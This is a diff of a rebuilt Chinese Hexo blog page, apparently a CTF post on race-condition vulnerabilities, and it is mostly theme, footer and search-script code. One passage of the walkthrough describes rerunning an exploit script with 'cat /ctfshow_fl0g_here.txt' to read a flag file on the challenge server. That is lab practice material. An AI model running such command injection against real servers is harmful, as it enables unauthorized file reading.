-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://swhat.github.io/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/05/25/XXE%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">XXE漏洞</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"><span class="paginator-prev__text">CISCN2021赛后复现</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.</span> <span class="toc-text">0x00-条件竞争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">0x01-基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02-漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CTF%E4%B8%AD%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">4.</span> <span class="toc-text">0x03-CTF中的条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-libs-pass17"><span class="toc-number">4.1.</span> <span class="toc-text">upload-libs pass17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfhsow-%E5%A4%A7%E7%89%9B%E6%9D%AF-web-checkin"><span class="toc-number">4.2.</span> <span class="toc-text">ctfhsow [大牛杯]-web_checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMCTF2020-Make-PHP-Great-Again"><span class="toc-number">4.3.</span> <span class="toc-text">[WMCTF2020]Make PHP Great Again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfhshow-web%E5%85%A5%E9%97%A8-web82"><span class="toc-number">4.4.</span> <span class="toc-text">ctfhshow [web入门]-web82</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfhshow-web%E5%85%A5%E9%97%A8-web149"><span class="toc-number">4.5.</span> <span class="toc-text">ctfhshow [web入门]-web149</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/2.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Atkx</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/swhat" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">22</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
-  var isXML = true;
-  var search_path = 'search.json';
+<p>跑脚本，发现了ctfshow_fl0g_here.txt文件<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>修改为cat /ctfshow_fl0g_here.txt继续跑脚本，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 
-  if (!search_path) {
-    search_path = 'search.xml';
-  } else if (/json$/i.test(search_path)) {
-    isXML = false;
-  }
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/WEB/">WEB</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/25/XXE%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XXE漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">CISCN2021赛后复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-  var path = '/' + search_path;
-  $.ajax({
-    url: path,
-    dataType: isXML ? 'xml' : 'json',
-    async: true,
-    success: function (res) {
-      var datas = isXML ? $('entry', res).map(function () {
-        // 将 XML 转为 JSON
-        return {
-          title: $('title', this).text(),
-          content: $('content', this).text(),
-          url: $('url', this).text()
-        };
-      }).get() : res;
-      var $input = $('.search-input input');
-      var $result = $('.search-results');
-      // 搜索对象（标题、内容）的权重，影响显示顺序
-      var WEIGHT = { title: 100, content: 1 };
-      var searchPost = function () {
-        var searchText = $input.val().toLowerCase().trim();
-        // 根据空白字符分隔关键字
-        var keywords = searchText.split(/[\s]+/);
-        // 搜索结果
-        var matchPosts = [];
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-        // 有多个关键字时，将原文字整个保存下来
-        if (keywords.length > 1) {
-          keywords.push(searchText);
-        }
-        // 防止未输入字符时搜索
-        if (searchText.length > 0) {
-          datas.forEach(function (data) {
-            var isMatch  = false;
-            // 没有标题的文章使用预设的 i18n 变量代替
-            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
-            var titleLower = title && title.toLowerCase();
-            // 删除 HTML 标签 和 所有空白字符
-            var content = data.content && data.content.replace(/<[^>]+>/g, '');
-            var contentLower = content && content.toLowerCase();
-            // 删除重复的 /
-            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
-            // 标题中匹配到的关键词
-            var titleHitSlice = [];
-            // 内容中匹配到的关键词
-            var contentHitSlice = [];
+      </div>
+    
+  </div>
+</div>
 
-            keywords.forEach(function (keyword) {
-              /**
-              * 获取匹配的关键词的索引
-              * @param {String} keyword 要匹配的关键字
-              * @param {String} text 原文字
-              * @param {Boolean} caseSensitive 是否区分大小写
-              * @param {Number} weight 匹配对象的权重。权重大的优先显示
-              * @return {Array}
-              */
-              function getIndexByword (word, text, caseSensitive, weight) {
-                if (!word || !text) {
-                  return [];
-                };
+<!-- Custom -->
 
-                var startIndex = 0; // 每次匹配的开始索引
-                var index = -1;     // 匹配到的索引值
-                var result = [];    // 匹配结果
 
-                if (!caseSensitive) {
-                  word = word.toLowerCase();
-                  text = text.toLowerCase();
-                }
+    
 
-                while((index = text.indexOf(word, startIndex)) !== -1) {
-                  var hasMatch = false;
-                  // 索引位置相同的关键词，保留长度较长的
-                  titleHitSlice.forEach(function (hit) {
-                    if (hit.index === index && hit.word.length < word.length) {
-                      hit.word = word;
-                      hasMatch = true;
-                    }
-                  });
-                  startIndex = index + word.length;
-                  !hasMatch && result.push({ index: index, word: word, weight: weight });
-                }
-                return result;
-              }
-              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
-              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
-            });
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-            var hitTitle = titleHitSlice.length;
-            var hitContent = contentHitSlice.length;
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
 
-            if (hitTitle > 0 || hitContent > 0) {
-              isMatch = true;
-            }
-            if (isMatch) {
-              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
-                // 按照匹配文字的索引的递增顺序排序
-                hit.sort(function (left, right) {
-                  return left.index - right.index;
-                });
-              });
-              /**
-              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
-              * @param {String} text 原文本
-              * @param {Array} hitSlice 匹配项的索引信息
-              * @param {Number} start 开始索引
-              * @param {Number} end 结束索引
-              * @return {String}
-              */
-              function highlightKeyword (text, hitSlice, start, end) {
-                if (!text || !hitSlice || !hitSlice.length) {
-                  return;
-                }
+    
+  </main>
 
-                var result = '';
-                var startIndex = start;
-                var endIndex = end;
-                hitSlice.forEach(function (hit) {
-                  if (hit.index < startIndex) {
-                    return;
-                  }
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    <!--《添加网站运行时间 -->
+<br/>
 
-                  var hitWordEnd = hit.index + hit.word.length;
-                  result += text.slice(startIndex, hit.index);
-                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
-                  startIndex = hitWordEnd;
-                });
-                result += text.slice(startIndex, endIndex);
-                return result;
-              }
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+var now = new Date(); 
 
-              var postData = {};
-              // 文章总的搜索权重
-              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
-              // 标记匹配关键词后的标题
-              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
-              // 标记匹配关键词后的内容
-              var postContent;
-              // 显示内容的长度
-              var SHOW_WORD_LENGTH = 200;
-              // 命中关键词前的字符显示长度
-              var SHOW_WORD_FRONT_LENGTH = 20;
-              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+function createtime() {
+    //此处修改你的建站时间或者网站上线时间
+    var grt = new Date('03/01/2020 8:00:00');
+    now.setTime(now.getTime() + 250);
+    days = (now - grt) / 1000 / 60 / 60 / 24;
 
-              // 截取匹配的第一个字符，前后共 200 个字符来显示
-              if (contentHitSlice.length > 0) {
-                var firstIndex = contentHitSlice[0].index;
-                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
-                var end = firstIndex + SHOW_WORD_END_LENGTH;
-                postContent = highlightKeyword(content, contentHitSlice, start, end);
-              } else { // 未匹配到内容，直接截取前 200 个字符来显示
-                postContent = content.slice(0, SHOW_WORD_LENGTH);
-              }
-              postData.title = postTitle;
-              postData.content = postContent;
-              postData.url = postURL;
-              postData.weight = postWeight;
-              matchPosts.push(postData);
-            }
-          });
-        }
-
-        var resultInnerHtml = '';
-        if (matchPosts.length) {
-          // 按权重递增的顺序排序，使权重大的优先显示
-          matchPosts.sort(function (left, right) {
-            return right.weight - left.weight;
-          });
-          resultInnerHtml += '<ul>';
-          matchPosts.forEach(function (post) {
-            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
-            resultInnerHtml += post.title;
-            resultInnerHtml += '</a><div class="search-results-content">';
-            resultInnerHtml += post.content;
-            resultInnerHtml += '</div></li>';
-          });
-          resultInnerHtml += '</ul>';
-        } else {
-          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
-        }
-        $result.html(resultInnerHtml);
-      };
-      $input.on('input', searchPost);
-      $input.on('keyup', function (e) {
-        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
-          searchPost();
-        }
-      });
+    dnum = Math.floor(days);
+    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+        hnum = "0" + hnum;
     }
-  });
+    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+        mnum = "0" + mnum;
+    }
+    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+        snum = "0" + snum;
+    }
+    document.getElementById("timeDate").innerHTML = " 本站已安全运行 " + dnum + " 天 ";
+    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
 }
+setInterval("createtime()", 250);
+</script>
 
-function closeSearch () {
-  $('body').css({ overflow: 'auto' });
-  $('.search-popup').css({ display: 'none' });
-  $('.search-mask').css({ display: 'none' });
-}
+<!-- 添加网站运行时间》-->
+  </div>
+  
 
-window.addEventListener('DOMContentLoaded', function () {
-  Stun.utils.pjaxReloadLocalSearch = function () {
-    $('.header-nav-search').on('click', function (e) {
-      e.stopPropagation();
-      $('body').css('overflow', 'hidden');
-      $('.search-popup')
-        .velocity('stop')
-        .velocity('transition.expandIn', {
-          duration: 300,
-          complete: function () {
-            $('.search-popup input').focus();
-          }
-        });
-      $('.search-mask')
-        .velocity('stop')
-        .velocity('transition.fadeIn', {
-          duration: 300
-        });
+  
 
-      initSearch();
-    });
-    $('.search-mask, .search-close').on('click', function () {
-      closeSearch();
-    });
-    $(document).on('keydown', function (e) {
-      // Escape <=> 27
-      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
-        closeSearch();
-      }
-    });
-  };
+    <div class="footer-center">
+         <!--添加工信备案号-->
+         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
+         <a href="http://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">豫ICP备2021010365号-1</a>
+         <br/>
+         <!--添加公安备案号-->
+         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
+         <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41040202000160"  style="color:#f72b07" target="_blank">豫公网安备41040202000160号</a>
+      </div>
+  
+</footer>
 
-  Stun.utils.pjaxReloadLocalSearch();
-}, false);
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
 
-function safeOpenUrl(url) {
-  var newTab = window.open();
-  newTab.opener = null;
-  newTab.location = url;
-}
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
-function extSearch(engine) {
-  var engines = {
-    google: 'https://www.google.com/search?q=',
-    bing: 'https://cn.bing.com/search?q=',
-    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
-  };
-  var host = window.location.host;
-  var query = $('.search-input input').val().toLowerCase().trim();
-  var uri = engines[engine] + query + ' site:' + host;
 
-  if (query) {
-    safeOpenUrl(uri);
-  } else {
-    Stun.utils.popAlert('warning', '请输入字符');
-  }
-}
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-var assistSearchList = window.CONFIG.assistSearch;
+<!-- Plugins -->
 
-if (Array.isArray(assistSearchList)) {
-  assistSearchList.forEach(function (name) {
-    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
-      extSearch(name);
-    }, false);
-  });
-}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/search.json";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+<script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
